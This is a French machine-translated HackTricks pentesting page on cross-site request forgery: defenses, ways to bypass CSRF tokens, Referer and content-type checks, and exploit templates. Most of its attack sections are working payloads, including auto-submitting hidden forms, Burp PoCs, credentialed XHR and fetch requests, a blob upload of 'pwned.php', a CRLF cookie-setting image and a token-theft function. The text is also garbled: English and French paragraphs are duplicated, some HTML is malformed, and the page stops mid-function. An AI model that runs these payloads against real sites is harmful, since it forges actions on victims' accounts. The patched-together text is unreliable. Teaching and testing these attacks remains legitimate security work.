# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Qu'est-ce que le CSRF ?

La **falsification de requ√™te intersite** (√©galement connue sous le nom de CSRF) est une vuln√©rabilit√© de s√©curit√© web qui permet √† un attaquant d'**inciter les utilisateurs √† effectuer des actions qu'ils ne souhaitent pas effectuer**.\
Cela est fait en **faisant acc√©der un utilisateur connect√©** sur la plateforme victime √† un site web contr√¥l√© par l'attaquant et √† partir de l√†, **ex√©cuter** du code JS malveillant, envoyer des formulaires ou r√©cup√©rer des "images" sur le **compte de la victime**.

### Pr√©requis

Pour pouvoir exploiter une vuln√©rabilit√© CSRF, vous devez d'abord **trouver une action pertinente √† exploiter** (changer de mot de passe ou d'adresse e-mail, faire en sorte que la victime vous suive sur un r√©seau social, vous donner plus de privil√®ges...). La **session doit reposer uniquement sur les cookies ou l'en-t√™te d'authentification de base HTTP**, aucun autre en-t√™te ne peut √™tre utilis√© pour g√©rer la session. Enfin, il ne doit pas y avoir de **param√®tres impr√©visibles** dans la requ√™te.

Plusieurs **contre-mesures** peuvent √™tre mises en place pour √©viter cette vuln√©rabilit√©.

### **D√©fenses courantes**

* [**Cookies SameSite**](hacking-with-cookies/#samesite) : Si le cookie de session utilise ce drapeau, il se peut que vous ne puissiez pas envoyer le cookie √† partir de sites web arbitraires.
* [**Partage des ressources entre origines**](cors-bypass.md) : Selon le type de requ√™te HTTP que vous devez effectuer pour exploiter l'action pertinente, vous pouvez prendre en compte la **politique CORS du site victime**. _Notez que la politique CORS n'affectera pas si vous voulez simplement envoyer une requ√™te GET ou une requ√™te POST √† partir d'un formulaire et que vous n'avez pas besoin de lire la r√©ponse._
* Demandez le **mot de passe** de l'utilisateur pour autoriser l'action.
* R√©solvez un **captcha**.
* Lisez les en-t√™tes **Referrer** ou **Origin**. Si une expression r√©guli√®re est utilis√©e, elle peut √™tre contourn√©e par exemple avec :
* http://mal.net?orig=http://example.com (se termine par l'URL)
* http://example.com.mal.net (commence par l'URL)
* **Modifiez** le **nom** des **param√®tres** de la requ√™te POST ou GET.
* Utilisez un **jeton CSRF** dans chaque session. Ce jeton doit √™tre envoy√© dans la requ√™te pour confirmer l'action. Ce jeton peut √™tre prot√©g√© par CORS.

### Carte CSRF

![](<../.gitbook/assets/image (112).png>)

## Contournement des d√©fenses

### Du POST au GET

Peut-√™tre que le formulaire que vous voulez exploiter est pr√©par√© pour envoyer une **requ√™te POST avec un jeton CSRF**, mais vous devriez **v√©rifier** si un **GET** est √©galement **valide** et si lorsque vous envoyez une requ√™te GET, le **jeton CSRF est toujours valid√©**.

### Absence de jeton

Certaines applications **valident correctement le jeton lorsqu'il est pr√©sent mais ignorent la validation si le jeton est omis**.\
Dans cette situation, l'attaquant peut **supprimer le param√®tre entier** contenant le jeton (pas seulement sa valeur) pour contourner la validation et effectuer une attaque CSRF.

### Le jeton CSRF n'est pas li√© √† la session utilisateur

Certaines applications ne **v√©rifient pas que le jeton appartient √† la m√™me session** que l'utilisateur qui effectue la requ√™te. Au lieu de cela, l'application **maintient un pool global de jetons** qu'elle a √©mis et accepte tout jeton qui appara√Æt dans ce pool.\
Dans cette situation, l'attaquant peut se connecter √† l'application en utilisant son propre compte, **obtenir un jeton valide**, puis **transmettre ce jeton √† l'utilisateur victime** dans son attaque CSRF.

### Contournement de la m√©thode

Si la requ√™te utilise une **m√©thode "√©trange"**, v√©rifiez si la **fonctionnalit√© de substitution de m√©thode** fonctionne.\
Par exemple, si elle utilise une m√©thode **PUT**, vous pouvez essayer d'utiliser une m√©thode **POST** et **envoyer** : _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Cela peut √©galement fonctionner en envoyant le **param√®tre \_method dans une requ√™te POST** ou en utilisant les **en-t√™tes** :

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### Contournement du jeton d'en-t√™te personnalis√©

Si la requ√™te ajoute un **en-t√™te personnalis√©** avec un **jeton** √† la requ√™te en tant que m√©thode de **protection CSRF**, alors :

* Testez la requ√™te sans le **jeton personnalis√© et √©galement l'en-t√™te**.
* Testez la requ√™te avec un **jeton diff√©rent mais de m√™me longueur**.

### Le jeton CSRF est v√©rifi√© par un cookie

Dans une variation ult√©rieure de la vuln√©rabilit√© pr√©c√©dente, certaines applications **dupliquent chaque jeton dans un cookie et un param√®tre de requ√™te**. Ou elles **d√©finissent un cookie csrf** et **v√©rifient en arri√®re-plan si le jeton csrf envoy√© correspond √† celui li√© au cookie**.

Lorsque la requ√™te suivante est valid√©e, l'application v√©rifie simplement que le **jeton** soumis dans le **param√®tre de requ√™te correspond** √† la valeur stock√©e par le **cookie**.\
Dans cette situation, l'attaquant peut √† nouveau effectuer une attaque CSRF **si le site web contient une vuln√©rabilit√© qui lui permettrait de d√©finir son cookie CSRF sur la victime comme un CRLF**.

Dans ce cas, vous pouvez d√©finir le cookie en essayant de charger une fausse image, puis lancer l'attaque CSRF comme dans cet exemple :
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
Notez que si le jeton csrf est li√© au cookie de session, cette attaque ne fonctionnera pas car vous devrez d√©finir votre session en tant que victime, et vous vous attaquerez donc vous-m√™me.
{% endhint %}

### Changement de Content-Type

Selon [**ceci**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), afin d'**√©viter les requ√™tes pr√©liminaires** en utilisant la m√©thode **POST**, voici les valeurs de Content-Type autoris√©es :

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Cependant, notez que la **logique des serveurs peut varier** en fonction du **Content-Type** utilis√©, vous devriez donc essayer les valeurs mentionn√©es ainsi que d'autres comme **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemple (√† partir de [ici](https://brycec.me/posts/corctf\_2021\_challenges)) d'envoi de donn√©es JSON en tant que text/plain :
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Contournement de la requ√™te de pr√©-v√©rification pour `application/json`

Comme vous le savez d√©j√†, vous ne pouvez pas envoyer une requ√™te POST avec le Content-Type **`application/json`** via un formulaire HTML, et si vous essayez de le faire via **`XMLHttpRequest`**, une requ√™te de pr√©-v√©rification est envoy√©e en premier.\
Cependant, vous pouvez essayer d'envoyer les donn√©es JSON en utilisant les types de contenu **`text/plain`** et **`application/x-www-form-urlencoded`** juste pour v√©rifier si le backend utilise les donn√©es ind√©pendamment du Content-Type.\
Vous pouvez envoyer un formulaire en utilisant `Content-Type: text/plain` en d√©finissant **`enctype="text/plain"`**

Si le serveur n'accepte que le type de contenu "application/json", vous pouvez **envoyer le type de contenu "text/plain; application/json"** sans d√©clencher de requ√™te de pr√©-v√©rification.

Vous pouvez √©galement essayer de **contourner** cette restriction en utilisant un fichier flash **SWF**. Pour plus d'informations, [**lisez cet article**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Contournement de la v√©rification du R√©f√©rent / Origine

**√âvitez l'en-t√™te Referer**

Certaines applications valident l'en-t√™te Referer lorsqu'il est pr√©sent dans les requ√™tes, mais **passent outre la validation si l'en-t√™te est omis**.
```markup
<meta name="referrer" content="never">
```
**Bypasses Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Pour d√©finir le nom de domaine du serveur dans l'URL que le R√©f√©rent va envoyer √† l'int√©rieur des param√®tres, vous pouvez faire :
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Contournement de la m√©thode HEAD**

La premi√®re partie de [**ce compte rendu CTF**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) explique que [le code source d'Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), un routeur est configur√© pour **traiter les requ√™tes HEAD comme des requ√™tes GET** sans corps de r√©ponse - une solution de contournement courante qui n'est pas propre √† Oak. Au lieu d'un gestionnaire sp√©cifique pour les requ√™tes HEAD, elles sont simplement **transmises au gestionnaire GET mais l'application supprime simplement le corps de r√©ponse**.

Par cons√©quent, si une requ√™te GET est limit√©e, vous pouvez simplement **envoyer une requ√™te HEAD qui sera trait√©e comme une requ√™te GET**.

## **Exemples d'exploitation**

### **Exfiltration du jeton CSRF**

Si un **jeton CSRF** est utilis√© comme **d√©fense**, vous pouvez essayer de **l'exfiltrer** en exploitant une vuln√©rabilit√© [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou une vuln√©rabilit√© [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET en utilisant des balises HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
D'autres balises HTML5 qui peuvent √™tre utilis√©es pour envoyer automatiquement une requ√™te GET sont :

![](<../.gitbook/assets/image (530).png>)

### Requ√™te GET de formulaire
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Requ√™te POST de formulaire

A common method used by web applications to send data to the server is through a form POST request. This type of request is commonly used for actions such as submitting a login form, creating a new user account, or updating user information.

Une m√©thode couramment utilis√©e par les applications web pour envoyer des donn√©es au serveur est la requ√™te POST de formulaire. Ce type de requ√™te est g√©n√©ralement utilis√© pour des actions telles que la soumission d'un formulaire de connexion, la cr√©ation d'un nouveau compte utilisateur ou la mise √† jour des informations utilisateur.

To send a form POST request, the web application constructs an HTML form with input fields for the desired data. When the user submits the form, the browser sends a POST request to the server with the form data as the request body.

Pour envoyer une requ√™te POST de formulaire, l'application web construit un formulaire HTML avec des champs de saisie pour les donn√©es souhait√©es. Lorsque l'utilisateur soumet le formulaire, le navigateur envoie une requ√™te POST au serveur avec les donn√©es du formulaire comme corps de la requ√™te.

The server then processes the request and performs the necessary actions based on the submitted data. It is important to note that the server trusts the request because it assumes that the request is legitimate and initiated by the user.

Le serveur traite ensuite la requ√™te et effectue les actions n√©cessaires en fonction des donn√©es soumises. Il est important de noter que le serveur fait confiance √† la requ√™te car il suppose que la requ√™te est l√©gitime et initi√©e par l'utilisateur.

### Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that exploits the trust between a web application and its users. In a CSRF attack, an attacker tricks a victim into performing an unwanted action on a web application in which the victim is authenticated.

La falsification de requ√™te intersite (CSRF) est une attaque qui exploite la confiance entre une application web et ses utilisateurs. Dans une attaque CSRF, un attaquant trompe une victime pour qu'elle effectue une action ind√©sirable sur une application web o√π la victime est authentifi√©e.

The attack works by crafting a malicious webpage or email that contains a request to the target web application. When the victim visits the malicious webpage or clicks on the malicious link in the email, their browser automatically sends the request to the target web application, using the victim's authenticated session.

L'attaque fonctionne en cr√©ant une page web ou un e-mail malveillant contenant une requ√™te vers l'application web cible. Lorsque la victime visite la page web malveillante ou clique sur le lien malveillant dans l'e-mail, son navigateur envoie automatiquement la requ√™te √† l'application web cible, en utilisant la session authentifi√©e de la victime.

As a result, the target web application processes the request, believing it to be legitimate and initiated by the victim. This can lead to unauthorized actions being performed on behalf of the victim, such as changing their password, making financial transactions, or deleting their account.

En cons√©quence, l'application web cible traite la requ√™te en croyant qu'elle est l√©gitime et initi√©e par la victime. Cela peut entra√Æner l'ex√©cution d'actions non autoris√©es au nom de la victime, telles que la modification de son mot de passe, la r√©alisation de transactions financi√®res ou la suppression de son compte.

To protect against CSRF attacks, web applications can implement measures such as using anti-CSRF tokens, checking the origin of requests, and requiring additional authentication for sensitive actions.

Pour se prot√©ger contre les attaques CSRF, les applications web peuvent mettre en place des mesures telles que l'utilisation de jetons anti-CSRF, la v√©rification de l'origine des requ√™tes et l'exigence d'une authentification suppl√©mentaire pour les actions sensibles.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Requ√™te POST de formulaire via iframe

One common technique used in Cross-Site Request Forgery (CSRF) attacks is to submit a form through an iframe. This technique allows an attacker to trick a user into unknowingly submitting a form on a vulnerable website.

Une technique couramment utilis√©e dans les attaques de falsification de requ√™tes intersites (CSRF) consiste √† soumettre un formulaire via un iframe. Cette technique permet √† un attaquant de tromper un utilisateur en lui faisant soumettre un formulaire sur un site vuln√©rable sans qu'il le sache.

To perform this attack, the attacker creates a malicious webpage that contains an iframe pointing to the target website's form. The form is pre-filled with the desired values, and JavaScript is used to automatically submit the form when the iframe loads.

Pour effectuer cette attaque, l'attaquant cr√©e une page web malveillante contenant un iframe pointant vers le formulaire du site cible. Le formulaire est pr√©-rempli avec les valeurs souhait√©es, et JavaScript est utilis√© pour soumettre automatiquement le formulaire lorsque l'iframe se charge.

When the victim visits the malicious webpage, the iframe loads the target website's form and submits it without the victim's knowledge. This allows the attacker to perform actions on behalf of the victim, such as changing their password or making unauthorized transactions.

Lorsque la victime visite la page web malveillante, l'iframe charge le formulaire du site cible et le soumet sans que la victime le sache. Cela permet √† l'attaquant d'effectuer des actions au nom de la victime, telles que changer son mot de passe ou effectuer des transactions non autoris√©es.

To protect against this type of attack, websites should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict access controls.

Pour se prot√©ger contre ce type d'attaque, les sites web doivent mettre en place des mesures telles que l'utilisation de jetons anti-CSRF, la validation de l'en-t√™te referrer et la mise en place de contr√¥les d'acc√®s stricts.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Requ√™te POST Ajax**

An Ajax POST request is a type of HTTP request that is sent asynchronously from a web page to a server using the Ajax technology. It allows the web page to update its content dynamically without having to reload the entire page.

Une requ√™te POST Ajax est un type de requ√™te HTTP qui est envoy√©e de mani√®re asynchrone depuis une page web vers un serveur en utilisant la technologie Ajax. Cela permet √† la page web de mettre √† jour son contenu de mani√®re dynamique sans avoir √† recharger la page enti√®re.

```javascript
$.ajax({
    url: '/update',
    type: 'POST',
    data: { name: 'John', age: 30 },
    success: function(response) {
        console.log('Update successful');
    },
    error: function(xhr, status, error) {
        console.log('Update failed');
    }
});
```

The above code snippet demonstrates an example of an Ajax POST request using jQuery. It sends a POST request to the '/update' endpoint with the data object containing the name and age parameters. If the request is successful, the 'success' callback function is executed, otherwise, the 'error' callback function is executed.

Le code ci-dessus montre un exemple de requ√™te POST Ajax utilisant jQuery. Il envoie une requ√™te POST vers l'endpoint '/update' avec l'objet de donn√©es contenant les param√®tres name et age. Si la requ√™te est r√©ussie, la fonction de rappel 'success' est ex√©cut√©e, sinon, la fonction de rappel 'error' est ex√©cut√©e.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Requ√™te POST multipart/form-data

When submitting a form on a website, the data is typically sent using the `application/x-www-form-urlencoded` format. However, in some cases, the form may require the use of the `multipart/form-data` format. This format is commonly used when uploading files or when the form contains binary data.

Lors de la soumission d'un formulaire sur un site web, les donn√©es sont g√©n√©ralement envoy√©es au format `application/x-www-form-urlencoded`. Cependant, dans certains cas, le formulaire peut n√©cessiter l'utilisation du format `multipart/form-data`. Ce format est couramment utilis√© lors du t√©l√©chargement de fichiers ou lorsque le formulaire contient des donn√©es binaires.

To craft a `multipart/form-data` POST request, you need to include a `Content-Type` header with the value `multipart/form-data`. Additionally, the request body should be formatted as a series of parts, each containing a `Content-Disposition` header specifying the name of the field and the filename (if applicable), followed by the actual data.

Pour cr√©er une requ√™te POST `multipart/form-data`, vous devez inclure un en-t√™te `Content-Type` avec la valeur `multipart/form-data`. De plus, le corps de la requ√™te doit √™tre format√© comme une s√©rie de parties, chacune contenant un en-t√™te `Content-Disposition` sp√©cifiant le nom du champ et le nom du fichier (si applicable), suivi des donn√©es r√©elles.

Here is an example of a `multipart/form-data` POST request:

Voici un exemple de requ√™te POST `multipart/form-data` :

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="username"

john.doe
-----------------------------1234567890
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

[Binary image data]
-----------------------------1234567890--
```

In this example, the request is being sent to `example.com/upload`. The request body consists of two parts: one for the `username` field and another for the `profile_picture` field. The `profile_picture` part includes the filename and the content type of the image.

Dans cet exemple, la requ√™te est envoy√©e √† `example.com/upload`. Le corps de la requ√™te se compose de deux parties : une pour le champ `username` et une autre pour le champ `profile_picture`. La partie `profile_picture` inclut le nom du fichier et le type de contenu de l'image.

By understanding how to craft a `multipart/form-data` POST request, you can effectively interact with web applications that require this format for data submission.

En comprenant comment cr√©er une requ√™te POST `multipart/form-data`, vous pouvez interagir efficacement avec des applications web qui n√©cessitent ce format pour la soumission de donn√©es.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Requ√™te POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

Dans cette technique, nous allons explorer comment effectuer une attaque de type Cross-Site Request Forgery (CSRF) en utilisant une requ√™te POST multipart/form-data.

#### Introduction

CSRF is an attack that tricks the victim into submitting a malicious request. It occurs when a malicious website or application forces a user's browser to perform an unwanted action on a trusted website where the user is authenticated.

Le CSRF est une attaque qui trompe la victime en lui faisant soumettre une requ√™te malveillante. Elle se produit lorsque un site web ou une application malveillante force le navigateur de l'utilisateur √† effectuer une action non d√©sir√©e sur un site web de confiance o√π l'utilisateur est authentifi√©.

#### Exploiting CSRF using multipart/form-data POST request

To exploit CSRF using a multipart/form-data POST request, follow these steps:

Pour exploiter le CSRF en utilisant une requ√™te POST multipart/form-data, suivez ces √©tapes :

1. Identify the target website: Choose the website where you want to perform the CSRF attack.

1. Identifier le site cible : Choisissez le site web sur lequel vous souhaitez effectuer l'attaque CSRF.

2. Identify the target endpoint: Identify the specific endpoint or URL where the action you want to perform is triggered.

2. Identifier le point d'extr√©mit√© cible : Identifiez le point d'extr√©mit√© ou l'URL sp√©cifique o√π l'action que vous souhaitez effectuer est d√©clench√©e.

3. Craft the malicious HTML page: Create an HTML page that contains a form with the necessary fields to perform the action on the target website.

3. Cr√©er la page HTML malveillante : Cr√©ez une page HTML qui contient un formulaire avec les champs n√©cessaires pour effectuer l'action sur le site web cible.

4. Set the form's action attribute to the target endpoint: In the form's HTML code, set the action attribute to the URL of the target endpoint.

4. D√©finir l'attribut action du formulaire sur le point d'extr√©mit√© cible : Dans le code HTML du formulaire, d√©finissez l'attribut action sur l'URL du point d'extr√©mit√© cible.

5. Set the form's method attribute to POST: In the form's HTML code, set the method attribute to POST.

5. D√©finir l'attribut method du formulaire sur POST : Dans le code HTML du formulaire, d√©finissez l'attribut method sur POST.

6. Set the form's enctype attribute to multipart/form-data: In the form's HTML code, set the enctype attribute to multipart/form-data.

6. D√©finir l'attribut enctype du formulaire sur multipart/form-data : Dans le code HTML du formulaire, d√©finissez l'attribut enctype sur multipart/form-data.

7. Include the necessary form fields: Add the necessary form fields to the HTML code, including any hidden fields or fields required by the target endpoint.

7. Inclure les champs de formulaire n√©cessaires : Ajoutez les champs de formulaire n√©cessaires au code HTML, y compris les champs cach√©s ou les champs requis par le point d'extr√©mit√© cible.

8. Submit the form automatically: Use JavaScript to automatically submit the form when the malicious HTML page is loaded.

8. Soumettre le formulaire automatiquement : Utilisez JavaScript pour soumettre automatiquement le formulaire lorsque la page HTML malveillante est charg√©e.

9. Trick the victim into visiting the malicious HTML page: Send the victim a link or embed the malicious HTML page in a website or email to trick them into visiting it.

9. Tromper la victime pour qu'elle visite la page HTML malveillante : Envoyez √† la victime un lien ou int√©grez la page HTML malveillante dans un site web ou un e-mail pour la tromper et l'inciter √† la visiter.

10. Perform the CSRF attack: When the victim visits the malicious HTML page, their browser will automatically submit the form, triggering the action on the target website.

10. Effectuer l'attaque CSRF : Lorsque la victime visite la page HTML malveillante, son navigateur soumettra automatiquement le formulaire, d√©clenchant ainsi l'action sur le site web cible.

By exploiting CSRF using a multipart/form-data POST request, an attacker can perform unauthorized actions on a target website, potentially leading to data manipulation, account takeover, or other malicious activities.

En exploitant le CSRF en utilisant une requ√™te POST multipart/form-data, un attaquant peut effectuer des actions non autoris√©es sur un site web cible, ce qui peut entra√Æner une manipulation de donn√©es, une prise de contr√¥le de compte ou d'autres activit√©s malveillantes.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Requ√™te POST de formulaire √† partir d'un iframe

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack by tricking a user into submitting a form without their knowledge or consent.

Lorsqu'un formulaire HTML est soumis, le navigateur envoie une requ√™te POST √† l'URL sp√©cifi√©e. Ce comportement peut √™tre exploit√© dans une attaque de falsification de requ√™te intersite (CSRF) en trompant un utilisateur pour qu'il soumette un formulaire sans son consentement ni sa connaissance.

To execute a CSRF attack using an iframe, the attacker can embed a malicious page containing a hidden form within an iframe on a legitimate website. When the user visits the legitimate website, the hidden form is automatically submitted, sending the user's data to the attacker's server.

Pour ex√©cuter une attaque CSRF en utilisant un iframe, l'attaquant peut int√©grer une page malveillante contenant un formulaire cach√© dans un iframe sur un site l√©gitime. Lorsque l'utilisateur visite le site l√©gitime, le formulaire cach√© est automatiquement soumis, envoyant les donn√©es de l'utilisateur au serveur de l'attaquant.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens, which are unique tokens embedded in forms to verify the authenticity of the request. Additionally, the SameSite attribute can be set to "Strict" or "Lax" in cookies to limit their scope and prevent cross-site requests.

Pour pr√©venir ce type d'attaque, les d√©veloppeurs web devraient mettre en place des mesures telles que l'utilisation de jetons anti-CSRF, qui sont des jetons uniques int√©gr√©s dans les formulaires pour v√©rifier l'authenticit√© de la requ√™te. De plus, l'attribut SameSite peut √™tre d√©fini sur "Strict" ou "Lax" dans les cookies pour limiter leur port√©e et emp√™cher les requ√™tes intersites.
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Vol de jeton CSRF et envoi d'une requ√™te POST**

To perform a CSRF attack, the first step is to steal the CSRF token from the target website. This token is usually embedded in the HTML source code or stored in a cookie. Once the token is obtained, it can be used to craft a malicious POST request.

Pour effectuer une attaque CSRF, la premi√®re √©tape consiste √† voler le jeton CSRF du site cible. Ce jeton est g√©n√©ralement int√©gr√© dans le code source HTML ou stock√© dans un cookie. Une fois le jeton obtenu, il peut √™tre utilis√© pour cr√©er une requ√™te POST malveillante.

To send the POST request, an attacker can create a form with hidden fields that include the stolen CSRF token. When the victim visits a page containing this form, the request will be automatically submitted without their knowledge.

Pour envoyer la requ√™te POST, un attaquant peut cr√©er un formulaire avec des champs cach√©s qui incluent le jeton CSRF vol√©. Lorsque la victime visite une page contenant ce formulaire, la requ√™te sera automatiquement soumise sans qu'elle le sache.

The POST request can be crafted to perform any action that the victim is authorized to do on the target website. This can include changing account settings, making purchases, or even deleting data.

La requ√™te POST peut √™tre cr√©√©e pour effectuer n'importe quelle action que la victime est autoris√©e √† effectuer sur le site cible. Cela peut inclure la modification des param√®tres du compte, des achats ou m√™me la suppression de donn√©es.

To protect against CSRF attacks, websites should implement measures such as using anti-CSRF tokens, checking the origin of requests, and implementing strict referer policies.

Pour se prot√©ger contre les attaques CSRF, les sites web doivent mettre en place des mesures telles que l'utilisation de jetons anti-CSRF, la v√©rification de l'origine des requ√™tes et la mise en place de politiques de r√©f√©rent strictes.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

